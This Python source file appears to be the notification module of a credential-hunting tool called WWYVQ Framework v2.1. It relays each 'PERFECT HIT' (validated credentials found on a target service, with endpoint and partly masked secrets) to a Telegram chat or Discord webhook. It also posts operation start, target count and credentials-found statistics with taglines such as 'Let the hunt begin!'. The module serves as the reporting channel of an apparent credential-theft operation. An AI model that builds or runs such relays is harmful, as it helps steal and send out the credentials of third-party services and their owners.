#!/usr/bin/env python3
"""
📱 WWYVQ Framework v2.1 - Notification Module
Ultra-Organized Architecture - Professional Notifications

Features:
- Professional Telegram notifications
- Discord webhook support
- Only valid credentials (no spam)
- Beautiful message formatting
- Rate limiting and optimization
- Notification templates
- Rich embeds and formatting
"""

import asyncio
import json
import time
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum
import aiohttp
from datetime import datetime


class NotificationType(Enum):
    """Notification types"""
    PERFECT_HIT = "perfect_hit"
    OPERATION_START = "operation_start"
    OPERATION_COMPLETE = "operation_complete"
    CRITICAL_ALERT = "critical_alert"
    ERROR_ALERT = "error_alert"
    STATISTICS_SUMMARY = "statistics_summary"


class NotificationPlatform(Enum):
    """Notification platforms"""
    TELEGRAM = "telegram"
    DISCORD = "discord"


@dataclass
class NotificationData:
    """Notification data structure"""
    platform: NotificationPlatform
    notification_type: NotificationType
    title: str
    message: str
    metadata: Dict[str, Any] = None
    priority: str = "normal"  # low, normal, high, critical
    timestamp: str = None
    
    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}
        if self.timestamp is None:
            self.timestamp = datetime.utcnow().isoformat()


class NotifierModule:
    """
    Professional notification module
    
    Features:
    - Multi-platform notifications
    - Professional formatting
    - Valid credentials only
    - Rate limiting
    """
    
    def __init__(self, config_manager, logger, engine):
        """Initialize notifier module"""
        self.config_manager = config_manager
        self.logger = logger
        self.engine = engine
        self.config = config_manager.get_config().notifier
        
        # HTTP session
        self.session = None
        
        # Rate limiting
        self.telegram_rate_limiter = asyncio.Semaphore(3)  # 3 messages per second
        self.discord_rate_limiter = asyncio.Semaphore(5)   # 5 messages per second
        
        # Message templates
        self.templates = {
            NotificationType.PERFECT_HIT: self._create_perfect_hit_template,
            NotificationType.OPERATION_START: self._create_operation_start_template,
            NotificationType.OPERATION_COMPLETE: self._create_operation_complete_template,
            NotificationType.CRITICAL_ALERT: self._create_critical_alert_template,
            NotificationType.ERROR_ALERT: self._create_error_alert_template,
            NotificationType.STATISTICS_SUMMARY: self._create_statistics_template
        }
        
        # Statistics
        self.stats = {
            'total_notifications': 0,
            'telegram_sent': 0,
            'discord_sent': 0,
            'failed_notifications': 0,
            'by_type': {}
        }
        
        self.logger.info("📱 Professional Notification Module initialized")
    
    async def send_perfect_hit(self, service: str, endpoint: str, credentials: Dict[str, Any], 
                              validation_result: Optional[Dict[str, Any]] = None):
        """Send perfect hit notification (VALID CREDENTIALS ONLY)"""
        try:
            # Only send if valid credentials and above threshold
            if validation_result:
                confidence = validation_result.get('confidence_score', 0.0)
                if confidence < self.config.notification_threshold:
                    self.logger.debug(f"Skipping notification - confidence {confidence} below threshold")
                    return
            
            # Create notification data
            notification_data = NotificationData(
                platform=NotificationPlatform.TELEGRAM,
                notification_type=NotificationType.PERFECT_HIT,
                title="🔥 PERFECT HIT - Valid Credentials Found!",
                message="",
                metadata={
                    'service': service,
                    'endpoint': endpoint,
                    'credentials': credentials,
                    'validation_result': validation_result
                },
                priority="high"
            )
            
            # Send notifications
            await self._send_notification(notification_data)
            
            self.logger.info(f"🎯 Perfect hit notification sent for {service}")
            
        except Exception as e:
            self.logger.error(f"Failed to send perfect hit notification: {e}")
    
    async def send_operation_start(self, operation_type: str, targets_count: int, session_id: str):
        """Send operation start notification"""
        try:
            notification_data = NotificationData(
                platform=NotificationPlatform.TELEGRAM,
                notification_type=NotificationType.OPERATION_START,
                title="🚀 Operation Started",
                message="",
                metadata={
                    'operation_type': operation_type,
                    'targets_count': targets_count,
                    'session_id': session_id
                },
                priority="normal"
            )
            
            await self._send_notification(notification_data)
            
        except Exception as e:
            self.logger.error(f"Failed to send operation start notification: {e}")
    
    async def send_operation_complete(self, operation_type: str, results: Dict[str, Any], 
                                    session_id: str):
        """Send operation complete notification"""
        try:
            notification_data = NotificationData(
                platform=NotificationPlatform.TELEGRAM,
                notification_type=NotificationType.OPERATION_COMPLETE,
                title="✅ Operation Completed",
                message="",
                metadata={
                    'operation_type': operation_type,
                    'results': results,
                    'session_id': session_id
                },
                priority="normal"
            )
            
            await self._send_notification(notification_data)
            
        except Exception as e:
            self.logger.error(f"Failed to send operation complete notification: {e}")
    
    async def send_critical_alert(self, alert_type: str, message: str, metadata: Dict[str, Any]):
        """Send critical alert notification"""
        try:
            notification_data = NotificationData(
                platform=NotificationPlatform.TELEGRAM,
                notification_type=NotificationType.CRITICAL_ALERT,
                title="🚨 CRITICAL ALERT",
                message=message,
                metadata={
                    'alert_type': alert_type,
                    **metadata
                },
                priority="critical"
            )
            
            await self._send_notification(notification_data)
            
            # Also send to Discord if enabled
            if self.config.discord_enabled:
                notification_data.platform = NotificationPlatform.DISCORD
                await self._send_notification(notification_data)
            
        except Exception as e:
            self.logger.error(f"Failed to send critical alert: {e}")
    
    async def send_statistics_summary(self, stats: Dict[str, Any]):
        """Send statistics summary"""
        try:
            notification_data = NotificationData(
                platform=NotificationPlatform.TELEGRAM,
                notification_type=NotificationType.STATISTICS_SUMMARY,
                title="📊 Statistics Summary",
                message="",
                metadata={'statistics': stats},
                priority="low"
            )
            
            await self._send_notification(notification_data)
            
        except Exception as e:
            self.logger.error(f"Failed to send statistics summary: {e}")
    
    async def _send_notification(self, notification_data: NotificationData):
        """Send notification to specified platform"""
        # Initialize session if needed
        await self._init_session()
        
        try:
            if notification_data.platform == NotificationPlatform.TELEGRAM:
                await self._send_telegram_notification(notification_data)
            elif notification_data.platform == NotificationPlatform.DISCORD:
                await self._send_discord_notification(notification_data)
            
            # Update statistics
            self.stats['total_notifications'] += 1
            platform_stat = f"{notification_data.platform.value}_sent"
            self.stats[platform_stat] += 1
            
            # Update by type
            type_name = notification_data.notification_type.value
            if type_name not in self.stats['by_type']:
                self.stats['by_type'][type_name] = 0
            self.stats['by_type'][type_name] += 1
            
        except Exception as e:
            self.stats['failed_notifications'] += 1
            self.logger.error(f"Failed to send {notification_data.platform.value} notification: {e}")
            raise
    
    async def _send_telegram_notification(self, notification_data: NotificationData):
        """Send Telegram notification"""
        if not self.config.telegram_enabled or not self.config.telegram_token:
            return
        
        async with self.telegram_rate_limiter:
            try:
                # Generate message from template
                template_func = self.templates.get(notification_data.notification_type)
                if template_func:
                    message = template_func(notification_data, NotificationPlatform.TELEGRAM)
                else:
                    message = f"{notification_data.title}\n\n{notification_data.message}"
                
                # Telegram API call
                url = f"https://api.telegram.org/bot{self.config.telegram_token}/sendMessage"
                
                payload = {
                    'chat_id': self.config.telegram_chat_id,
                    'text': message,
                    'parse_mode': 'HTML',
                    'disable_web_page_preview': True
                }
                
                async with self.session.post(url, json=payload) as response:
                    if response.status == 200:
                        self.logger.debug("Telegram notification sent successfully")
                    else:
                        response_text = await response.text()
                        self.logger.error(f"Telegram API error: {response.status} - {response_text}")
                        raise Exception(f"Telegram API error: {response.status}")
                
                # Rate limiting delay
                await asyncio.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"Failed to send Telegram notification: {e}")
                raise
    
    async def _send_discord_notification(self, notification_data: NotificationData):
        """Send Discord notification"""
        if not self.config.discord_enabled or not self.config.discord_webhook:
            return
        
        async with self.discord_rate_limiter:
            try:
                # Generate message from template
                template_func = self.templates.get(notification_data.notification_type)
                if template_func:
                    embed_data = template_func(notification_data, NotificationPlatform.DISCORD)
                else:
                    embed_data = {
                        'title': notification_data.title,
                        'description': notification_data.message,
                        'color': self._get_color_for_priority(notification_data.priority),
                        'timestamp': notification_data.timestamp
                    }
                
                payload = {
                    'embeds': [embed_data]
                }
                
                async with self.session.post(self.config.discord_webhook, json=payload) as response:
                    if response.status in [200, 204]:
                        self.logger.debug("Discord notification sent successfully")
                    else:
                        response_text = await response.text()
                        self.logger.error(f"Discord webhook error: {response.status} - {response_text}")
                        raise Exception(f"Discord webhook error: {response.status}")
                
                # Rate limiting delay
                await asyncio.sleep(0.2)
                
            except Exception as e:
                self.logger.error(f"Failed to send Discord notification: {e}")
                raise
    
    def _create_perfect_hit_template(self, notification_data: NotificationData, 
                                   platform: NotificationPlatform) -> Any:
        """Create perfect hit notification template"""
        metadata = notification_data.metadata
        service = metadata.get('service', 'Unknown')
        endpoint = metadata.get('endpoint', 'Unknown')
        credentials = metadata.get('credentials', {})
        validation_result = metadata.get('validation_result', {})
        
        if platform == NotificationPlatform.TELEGRAM:
            # Telegram HTML format
            message = f"""
🔥 <b>PERFECT HIT - Valid Credentials Found!</b> 🔥

🎯 <b>Service:</b> {service}
🌐 <b>Endpoint:</b> <code>{endpoint}</code>

💳 <b>Credentials Found:</b>
"""
            
            for cred_type, cred_value in credentials.items():
                # Mask sensitive parts
                masked_value = self._mask_credential(cred_value)
                message += f"   • <b>{cred_type}:</b> <code>{masked_value}</code>\n"
            
            if validation_result:
                confidence = validation_result.get('confidence_score', 0.0)
                status = validation_result.get('status', 'unknown')
                method = validation_result.get('validation_method', 'unknown')
                
                message += f"""
✅ <b>Validation:</b>
   • <b>Status:</b> {status.upper()}
   • <b>Confidence:</b> {confidence:.1%}
   • <b>Method:</b> {method}
"""
            
            message += f"""
⏰ <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
🆔 <b>Framework:</b> WWYVQ v2.1

🔥 <i>Another successful hunt!</i> 🔥
"""
            
            return message
        
        elif platform == NotificationPlatform.DISCORD:
            # Discord embed format
            fields = []
            
            # Service and endpoint
            fields.append({
                'name': '🎯 Service',
                'value': f'`{service}`',
                'inline': True
            })
            
            fields.append({
                'name': '🌐 Endpoint',
                'value': f'`{endpoint}`',
                'inline': True
            })
            
            # Credentials
            cred_text = ""
            for cred_type, cred_value in credentials.items():
                masked_value = self._mask_credential(cred_value)
                cred_text += f"**{cred_type}:** `{masked_value}`\n"
            
            fields.append({
                'name': '💳 Credentials',
                'value': cred_text,
                'inline': False
            })
            
            # Validation
            if validation_result:
                confidence = validation_result.get('confidence_score', 0.0)
                status = validation_result.get('status', 'unknown')
                method = validation_result.get('validation_method', 'unknown')
                
                fields.append({
                    'name': '✅ Validation',
                    'value': f"**Status:** {status.upper()}\n**Confidence:** {confidence:.1%}\n**Method:** {method}",
                    'inline': True
                })
            
            return {
                'title': '🔥 PERFECT HIT - Valid Credentials Found!',
                'description': 'Another successful credential discovery!',
                'color': 0xFF4500,  # Orange red
                'fields': fields,
                'timestamp': notification_data.timestamp,
                'footer': {
                    'text': 'WWYVQ Framework v2.1'
                }
            }
    
    def _create_operation_start_template(self, notification_data: NotificationData,
                                       platform: NotificationPlatform) -> Any:
        """Create operation start notification template"""
        metadata = notification_data.metadata
        operation_type = metadata.get('operation_type', 'Unknown')
        targets_count = metadata.get('targets_count', 0)
        session_id = metadata.get('session_id', 'Unknown')
        
        if platform == NotificationPlatform.TELEGRAM:
            message = f"""
🚀 <b>Operation Started</b>

🎯 <b>Type:</b> {operation_type.upper()}
📊 <b>Targets:</b> {targets_count:,}
🆔 <b>Session:</b> <code>{session_id}</code>
⏰ <b>Started:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

🔥 <i>Let the hunt begin!</i>
"""
            return message
        
        elif platform == NotificationPlatform.DISCORD:
            return {
                'title': '🚀 Operation Started',
                'description': 'New operation has been initiated',
                'color': 0x00FF00,  # Green
                'fields': [
                    {'name': '🎯 Type', 'value': f'`{operation_type.upper()}`', 'inline': True},
                    {'name': '📊 Targets', 'value': f'`{targets_count:,}`', 'inline': True},
                    {'name': '🆔 Session', 'value': f'`{session_id}`', 'inline': False}
                ],
                'timestamp': notification_data.timestamp,
                'footer': {'text': 'WWYVQ Framework v2.1'}
            }
    
    def _create_operation_complete_template(self, notification_data: NotificationData,
                                          platform: NotificationPlatform) -> Any:
        """Create operation complete notification template"""
        metadata = notification_data.metadata
        operation_type = metadata.get('operation_type', 'Unknown')
        results = metadata.get('results', {})
        session_id = metadata.get('session_id', 'Unknown')
        
        results_count = len(results.get('results', []))
        errors_count = len(results.get('errors', []))
        
        if platform == NotificationPlatform.TELEGRAM:
            message = f"""
✅ <b>Operation Completed</b>

🎯 <b>Type:</b> {operation_type.upper()}
📊 <b>Results:</b> {results_count}
❌ <b>Errors:</b> {errors_count}
🆔 <b>Session:</b> <code>{session_id}</code>
⏰ <b>Completed:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

🎉 <i>Mission accomplished!</i>
"""
            return message
        
        elif platform == NotificationPlatform.DISCORD:
            return {
                'title': '✅ Operation Completed',
                'description': 'Operation has finished successfully',
                'color': 0x00FF00,  # Green
                'fields': [
                    {'name': '🎯 Type', 'value': f'`{operation_type.upper()}`', 'inline': True},
                    {'name': '📊 Results', 'value': f'`{results_count}`', 'inline': True},
                    {'name': '❌ Errors', 'value': f'`{errors_count}`', 'inline': True},
                    {'name': '🆔 Session', 'value': f'`{session_id}`', 'inline': False}
                ],
                'timestamp': notification_data.timestamp,
                'footer': {'text': 'WWYVQ Framework v2.1'}
            }
    
    def _create_critical_alert_template(self, notification_data: NotificationData,
                                      platform: NotificationPlatform) -> Any:
        """Create critical alert notification template"""
        metadata = notification_data.metadata
        alert_type = metadata.get('alert_type', 'Unknown')
        
        if platform == NotificationPlatform.TELEGRAM:
            message = f"""
🚨 <b>CRITICAL ALERT</b> 🚨

⚠️ <b>Type:</b> {alert_type}
📝 <b>Message:</b> {notification_data.message}
⏰ <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}

🔥 <i>Immediate attention required!</i>
"""
            return message
        
        elif platform == NotificationPlatform.DISCORD:
            return {
                'title': '🚨 CRITICAL ALERT',
                'description': notification_data.message,
                'color': 0xFF0000,  # Red
                'fields': [
                    {'name': '⚠️ Alert Type', 'value': f'`{alert_type}`', 'inline': True}
                ],
                'timestamp': notification_data.timestamp,
                'footer': {'text': 'WWYVQ Framework v2.1'}
            }
    
    def _create_error_alert_template(self, notification_data: NotificationData,
                                   platform: NotificationPlatform) -> Any:
        """Create error alert notification template"""
        if platform == NotificationPlatform.TELEGRAM:
            message = f"""
❌ <b>Error Alert</b>

📝 <b>Message:</b> {notification_data.message}
⏰ <b>Time:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}
"""
            return message
        
        elif platform == NotificationPlatform.DISCORD:
            return {
                'title': '❌ Error Alert',
                'description': notification_data.message,
                'color': 0xFFFF00,  # Yellow
                'timestamp': notification_data.timestamp,
                'footer': {'text': 'WWYVQ Framework v2.1'}
            }
    
    def _create_statistics_template(self, notification_data: NotificationData,
                                  platform: NotificationPlatform) -> Any:
        """Create statistics summary notification template"""
        stats = notification_data.metadata.get('statistics', {})
        
        if platform == NotificationPlatform.TELEGRAM:
            message = f"""
📊 <b>Statistics Summary</b>

🎯 <b>Operations:</b> {stats.get('operations_total', 0)}
✅ <b>Completed:</b> {stats.get('operations_completed', 0)}
❌ <b>Failed:</b> {stats.get('operations_failed', 0)}
📈 <b>Targets:</b> {stats.get('targets_processed', 0)}
🔑 <b>Credentials:</b> {stats.get('credentials_found', 0)}
⏰ <b>Uptime:</b> {stats.get('uptime_seconds', 0)//3600}h {(stats.get('uptime_seconds', 0)%3600)//60}m

📊 <i>Keep up the great work!</i>
"""
            return message
        
        elif platform == NotificationPlatform.DISCORD:
            return {
                'title': '📊 Statistics Summary',
                'description': 'Current framework statistics',
                'color': 0x0099FF,  # Blue
                'fields': [
                    {'name': '🎯 Operations', 'value': f"`{stats.get('operations_total', 0)}`", 'inline': True},
                    {'name': '✅ Completed', 'value': f"`{stats.get('operations_completed', 0)}`", 'inline': True},
                    {'name': '❌ Failed', 'value': f"`{stats.get('operations_failed', 0)}`", 'inline': True},
                    {'name': '📈 Targets', 'value': f"`{stats.get('targets_processed', 0)}`", 'inline': True},
                    {'name': '🔑 Credentials', 'value': f"`{stats.get('credentials_found', 0)}`", 'inline': True},
                    {'name': '⏰ Uptime', 'value': f"`{stats.get('uptime_seconds', 0)//3600}h {(stats.get('uptime_seconds', 0)%3600)//60}m`", 'inline': True}
                ],
                'timestamp': notification_data.timestamp,
                'footer': {'text': 'WWYVQ Framework v2.1'}
            }
    
    def _mask_credential(self, credential: str) -> str:
        """Mask credential for safe display"""
        if len(credential) <= 8:
            return "*" * len(credential)
        elif len(credential) <= 16:
            return credential[:3] + "*" * (len(credential) - 6) + credential[-3:]
        else:
            return credential[:4] + "*" * (len(credential) - 8) + credential[-4:]
    
    def _get_color_for_priority(self, priority: str) -> int:
        """Get Discord color for priority"""
        color_mapping = {
            'low': 0x808080,      # Gray
            'normal': 0x0099FF,   # Blue
            'high': 0xFF4500,     # Orange
            'critical': 0xFF0000  # Red
        }
        return color_mapping.get(priority, 0x0099FF)
    
    async def _init_session(self):
        """Initialize HTTP session"""
        if not self.session:
            connector = aiohttp.TCPConnector(limit=10)
            timeout = aiohttp.ClientTimeout(total=30)
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            )
    
    async def _close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_statistics(self) -> Dict[str, Any]:
        """Get notification statistics"""
        return self.stats.copy()
    
    async def test_notification(self, platform: NotificationPlatform = NotificationPlatform.TELEGRAM):
        """Send test notification"""
        try:
            test_data = NotificationData(
                platform=platform,
                notification_type=NotificationType.PERFECT_HIT,
                title="🧪 Test Notification",
                message="This is a test notification from WWYVQ v2.1",
                metadata={
                    'service': 'Test Service',
                    'endpoint': 'https://test.example.com',
                    'credentials': {'test_key': 'test_value'},
                    'validation_result': {
                        'status': 'valid',
                        'confidence_score': 0.95,
                        'validation_method': 'TEST'
                    }
                },
                priority="normal"
            )
            
            await self._send_notification(test_data)
            self.logger.info(f"✅ Test notification sent to {platform.value}")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Test notification failed: {e}")
            return False
    
    async def shutdown(self):
        """Shutdown module"""
        await self._close_session()
        self.logger.info("🛑 Professional Notification Module shutdown completed")